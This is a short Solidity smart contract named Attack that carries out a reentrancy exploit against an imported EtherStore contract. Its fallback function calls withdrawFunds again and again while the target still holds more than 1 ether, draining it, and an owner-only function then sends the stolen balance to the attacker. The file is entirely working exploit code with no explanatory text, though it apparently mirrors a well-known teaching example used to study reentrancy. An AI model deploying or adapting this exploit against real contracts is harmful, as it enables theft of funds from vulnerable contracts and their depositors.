//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./EtherStore.sol";

contract Attack {

    address private owner;

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        owner = msg.sender;
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attack() payable public {
        etherStore.depositFunds{value: 1 ether}();
        etherStore.withdrawFunds(1 ether);
    }

    function withdrawEthers() external {
        require(msg.sender == owner, "You have no rights on those ethers");
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() payable external {
        if(address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

}